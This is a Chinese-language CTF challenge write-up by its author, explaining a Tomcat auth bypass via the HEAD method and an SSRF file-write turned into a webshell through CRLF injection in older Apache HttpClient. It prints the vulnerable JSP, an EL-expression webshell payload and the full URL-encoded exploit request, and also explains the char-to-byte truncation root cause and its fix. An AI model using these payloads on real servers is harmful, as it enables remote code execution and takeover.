# 前言
本次题目总共四位师傅做出都是预期解，按照顺序依次为：`Y4tacker、珂字辈、TDOU、nopoint`。应该还有其他人做出来可能是在本地环境做的所以不在统计范围里。

对日志进行统计分析

![](https://files.mdnice.com/user/114427/8b2d0586-3ba9-4ec1-af10-691e25fbd5e1.png)
有`201`个不同的IP进行了挑战，其中`86`个找到了绕过访问控制请求`/admin/getimg.jsp`的方法

# 出题思路
本题分为两部分，第一部分为权限绕过，第二部分为`SSRF`文件下载不出网`getshell`。

第一部分：

几年前审计某国外设备遇到一种特殊权限绕过，感觉网上没人讲过想分享一下给大家学习一下。因为比较简单，出题的时候我正好在看`Servlet`规范所以用了不常见的规范把权限验证隐藏了起来。

第二部分：

这个部分是在去年审计某个产品时存在`SSRF`文件下载，为了让这个漏洞更加通用就进行了不出网的研究，然后发现了一些有意思的地方。

# 题解
下载题目源码，搭建`tomcat`进行测试分析。
![](https://files.mdnice.com/user/114427/068cfba7-902c-4390-b088-1d6d5315fe81.png)
对项目进行分析发现仅存在一个`jsp`文件，`web.xml`配置为空

![](https://files.mdnice.com/user/114427/11d16ed0-fa80-4cd2-9f90-016c2f71915f.png)

查看`/admin/getimg.jsp`源码
```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="org.apache.http.client.methods.CloseableHttpResponse" %>
<%@ page import="org.apache.http.client.methods.HttpGet" %>
<%@ page import="org.apache.http.impl.client.CloseableHttpClient" %>
<%@ page import="org.apache.http.impl.client.HttpClients" %>
<%@ page import="org.apache.http.util.EntityUtils" %>
<%@ page import="java.io.*" %>
<%
	
    String targetUrl = request.getParameter("url");
	String token = request.getParameter("token");
    if (targetUrl != null && token != null) {
        CloseableHttpClient httpClient = null;
        CloseableHttpResponse httpResponse = null;
        FileOutputStream fos = null;
        try {
            httpClient = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(targetUrl);
			httpGet.addHeader("Token", token);
            httpResponse = httpClient.execute(httpGet);
            byte[] content = EntityUtils.toByteArray(httpResponse.getEntity());
            String fileName = "";
            int lastSlashIndex = targetUrl.lastIndexOf('/');
            if (lastSlashIndex != -1 && lastSlashIndex < targetUrl.length() - 1) {
                fileName = targetUrl.substring(lastSlashIndex + 1);
                }
            String webRootPath = application.getRealPath("/");
			if (fileName.indexOf("..") != -1) {
				fileName = "error";
			}
            String filePath = webRootPath + "/img/" + fileName;
            fos = new FileOutputStream(filePath);
            fos.write(content);
            fos.flush();
            out.println("访问地址: " + request.getContextPath() + "/" + fileName);
        } catch (Exception e) {
            out.println("错误: " + e.getMessage());
            e.printStackTrace();
        } finally {
            try {
                if (fos != null) fos.close();
                if (httpResponse != null) httpResponse.close();
                if (httpClient != null) httpClient.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    } else {
        out.println("请提供 url、token参数");
    }
%>

```
这个文件存在`SSRF`文件写入，后缀无任何限制，写入的文件名为最后一个斜杠后的内容，路径为`/img/filename`，不能使用`..`。

## 权限绕过
我们请求`/admin/getimg.jsp`进行测试

![](https://files.mdnice.com/user/114427/b22048eb-9417-4dcb-b6fe-947764c20205.png)
发现为`403`，这里有两个办法要么就是调试`tomcat`查看在哪里进行的权限验证，或者是找到我隐藏的配置文件。

我将配置文件放在了`apache-tomcat-9.0.10\webapps\ROOT\WEB-INF\lib\ant-apache-xalan2.jar!\META-INF\web-fragment.xml`
```
<?xml version="1.0" encoding="UTF-8"?>
<web-fragment xmlns="http://xmlns.jcp.org/xml/ns/javaee"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                                  http://xmlns.jcp.org/xml/ns/javaee/web-fragment_3_1.xsd"
              version="3.1">
    
    <name>securityFragment</name>
    
	<security-constraint>
		<web-resource-collection>
			<web-resource-name>Admin Area</web-resource-name>
			<url-pattern>/admin/*</url-pattern>
			<http-method>GET</http-method>
			<http-method>POST</http-method>
		</web-resource-collection>
		<auth-constraint>
		</auth-constraint>
	</security-constraint>
    
</web-fragment>

```
`Servlet 3.0`引入的`web-fragment`特性支持模块化配置，第三方库可以在`META-INF/web-fragment.xml`中定义自己的 Servlet、Filter 等。

然后我们观察到对`/admin/*`请求方法为`GET、POST`进行了限制，此时想到`jsp`是否支持其他方法进行访问所以使用`OPTIONS`方法进行请求。

![](https://files.mdnice.com/user/114427/c4c5f8e4-8426-4a79-9c6e-c50a0213b2fc.png)
发现除了`GET、POST、OPTIONS`外还支持`HEAD`方法，我们找一个`jsp`转换为`java`的源码

![](https://files.mdnice.com/user/114427/eddbf07b-e848-48e6-9bc1-a63ea30d639c.png)
可以看到代码对这些请求方法的处理流程。

所以我们直接使用`HEAD`方法即可绕过权限校验。

![](https://files.mdnice.com/user/114427/14de555a-05ff-4a85-a70a-c923c4113628.png)

这里可以发散到`Servlet`的方法处理，假设存在一个`Servlet`只重写`doGet、doPost`方法那么其可以用`HEAD`访问吗

![](https://files.mdnice.com/user/114427/93ed460d-a7a6-4ec3-b9a0-6ed19aa16063.png)
答案是可以的，查看`javax.servlet.http.HttpServlet#service`的方法调度

![](https://files.mdnice.com/user/114427/994cdaa0-86db-4519-906d-0e4df7a8828e.png)

![](https://files.mdnice.com/user/114427/33e37157-1d58-419c-b701-d8bcf03acd6f.png)
`HEAD`最后也会进入`doGet`只不过设置了`NoBodyResponse`

## 不出网写shell
这里我限定了一个条件服务器不出网，而且这里使用的`Apache HttpClient`支持`http\s`协议。所以我们实际上只能请求`tomcat`服务本身来进行利用，而且`getimg.jsp`只支持`HEAD`访问也不太可能通过`getimg.jsp`报错来利用。这个`SSRF`文件写入，后缀无任何限制，写入的文件名为最后一个斜杠后的内容，路径为`/img/filename`，不能使用`..`。所以只可能是写`jsp\jspx`来获取服务器权限。

![](https://files.mdnice.com/user/114427/579f4d80-28df-497b-a502-c166d940d883.png)

所以问题变为我们可以控制`url、token`然后去访问现在的这个`web`服务，怎么制造出一个返回包里面包含jsp代码。

首先想到的是通过输入不存在的`url`会回显到返回包里

![](https://files.mdnice.com/user/114427/e38baf83-fea5-4e14-b5ed-70e3d276e743.png)
但是经过测试，`{} <>`都不能使用会直接`400`且返回包不再返回路径，所以这个地方是不行的。

然后转到`token`这里是在请求头值的部分。首先这部分内容是不会回显到返回包的。

然后对这部分进行`fuzz`看是否有什么字符会触发报错导致返回包出现内容

![](https://files.mdnice.com/user/114427/6980da0c-2423-494a-bb86-495534fa5b9c.png)
发现当出现`\n`时报错了且我们输入的值可以回显在返回包中
![](https://files.mdnice.com/user/114427/426f4ec8-600b-4088-b140-aaebcc136ba9.png)
这里的报错其实就是因为换行了，导致我们后面的字符变成了另外一个头但是这个头没有`:`所以报错。

然后我们测试这个地方是否支持`{} <>`

![](https://files.mdnice.com/user/114427/baf6002e-61b2-455b-914d-09793761751e.png)
发现是支持`{}`所以这里我们可以**使用EL表达式来构造webshell**

EL表达式如下

`${param.getClass().forName(param.error).newInstance().getEngineByName(param.Engine).eval(param.cmd)}`
![](https://files.mdnice.com/user/114427/57bfc4c0-8703-4606-ae2b-dc161baf0a95.png)
可以完美回显。然后我们到`/admin/getimg.jsp`进行测试

![](https://files.mdnice.com/user/114427/3a537bae-3fb8-40f1-95cc-529fd7ab5f31.png)
查看生成的jsp
![](https://files.mdnice.com/user/114427/29929569-c4bb-4149-b24d-88aba2f27724.png)
没有报错，还是404。于是本地监听一个端口进行测试


![](https://files.mdnice.com/user/114427/3bb8c97d-9b9b-49e1-927a-3e09f6a488db.png)

发现`\n`并没有换行，应该是`Apache HttpClient`对`CRLF`注入做了防御。

通过搜索或者询问AI可以找到这个`issues`(或者直接搜索`CRLF`注入有类似的payload)

*https://issues.apache.org/jira/browse/HTTPCLIENT-1974?page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel&focusedCommentId=16797961*


![](https://files.mdnice.com/user/114427/7a189018-b669-4f3e-b9b8-fffe179a054b.png)
找到一种绕过方式使用`\u560d\u560a`来代替`\r\n`，然后我们将`\u560a`进行URL编码
![](https://files.mdnice.com/user/114427/80ef2e41-eba7-4653-8d18-060eb9f562d3.png)
请求
```
HEAD /admin/getimg.jsp?url=http://127.0.0.1:8088/dsada.jsp&token=dasd%E5%98%8A%24%7b%70%61%72%61%6d%2e%67%65%74%43%6c%61%73%73%28%29%2e%66%6f%72%4e%61%6d%65%28%70%61%72%61%6d%2e%65%72%72%6f%72%29%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%29%2e%67%65%74%45%6e%67%69%6e%65%42%79%4e%61%6d%65%28%70%61%72%61%6d%2e%45%6e%67%69%6e%65%29%2e%65%76%61%6c%28%70%61%72%61%6d%2e%63%6d%64%29%7d
```
![](https://files.mdnice.com/user/114427/a89a58c1-86e8-4749-a1a9-4959a5ec3a91.png)
查看jsp内容，发现成功写入

![](https://files.mdnice.com/user/114427/ea21b179-cfd4-4fd6-9b49-bf6dbf30eee3.png)
构造参数及JS表达式注入内存马
![](https://files.mdnice.com/user/114427/83a2dc3a-d6d8-4097-8976-c0dd9c2be562.png)

![](https://files.mdnice.com/user/114427/3ad31754-b2a0-4c13-9b29-9a1ec4c86df5.png)

# 题外
`小晨曦`师傅提出我使用的`tomcat`版本较老，权限绕过部分可以使用`CVE-2020-1938`漏洞来绕过

![](https://files.mdnice.com/user/114427/558f9194-7917-4600-91e3-8927a631b485.png)
还有就是如果我们能控制请求头部分的话，无需`CRLF`也可以通过报错返回`EL`表达式的`payload`

![](https://files.mdnice.com/user/114427/4f8e9831-5978-459e-977b-5b3e45cdb5c0.png)
然后这个地方不同的`tomcat`版本是不一样的，有的版本请求头的值部分就可以直接利用。但是URL部分只有很老很老的`tomcat`可以。

![](https://files.mdnice.com/user/114427/fa2c0743-f042-491b-93d4-7a2d3c67f226.png)
然后上面其实留下了一个疑问，为什么`\u560a`会转换为`\u000a`？首先我们经过测试发现`Apache HttpClient`在`4.5.10`修复了这个漏洞

我们对比前后版本的代码找到修复的地方位于`org\apache\http\util\ByteArrayBuffer.class`

![](https://files.mdnice.com/user/114427/b6525c39-1be7-4bc1-bc44-5b4733c6e39f.png)
这个漏洞的核心原因在于**Java 的数据类型强制转换导致的高位截断**，而修复方案则是通过白名单过滤来确保只有安全的字符被写入，凡是超过`\u00ff`的字符将直接替换为`?`。

在修复前的代码中，有一行关键的强制类型转换：

`this.buffer[i2] = (byte)b[i1];`

这行代码将一个`char`强制转换为了`byte`。当把一个16位的数据强转为8位时，Java会直接丢弃高8位，只保留低8位。所以`\u560a`会转换为`\u000a`

![](https://files.mdnice.com/user/114427/24f0ab77-6ecc-42f4-b9e4-dd7cdecc63c6.png)
实际上`\uxx0a`（xx为任意值）都可以。

![](https://files.mdnice.com/user/114427/400bb995-8a2d-4e79-ae57-53a2f740a228.png)
然后这个地方还有一个有趣的点，可能在某些场景里有用

![](https://files.mdnice.com/user/114427/d03e32d9-f9f0-4146-9478-1e3846465626.png)

# 总结
这道题目主要包含`权限绕过`和`不出网 SSRF Getshell`两个核心考点。

**1. 权限绕过（第一部分）**
- 利用Servlet 3.0的`web-fragment.xml`特性，在JAR包的`META-INF`目录下隐藏了安全配置
- 配置仅限制了`GET`和`POST`方法访问`/admin/*`路径
- 通过使用`HEAD`方法绕过权限验证，因为JSP默认支持HEAD请求

**2. SSRF不出网GetShell（第二部分）**
- 目标存在SSRF文件下载功能，可控`url`和`token`参数
- 利用Apache HttpClient 4.5.10之前版本的CRLF注入漏洞
- 通过`\u560a`绕过换行过滤（高位截断原理：char强转byte时丢弃高8位）
- 在HTTP请求头中注入EL表达式payload
- 利用Tomcat错误回显机制将EL表达式写入JSP文件
- 最终通过ScriptEngine执行任意代码注入内存马

**char强转byte导致高位丢失很有意思，感觉还可以去看看其他地方会不会有类似实现的问题。**
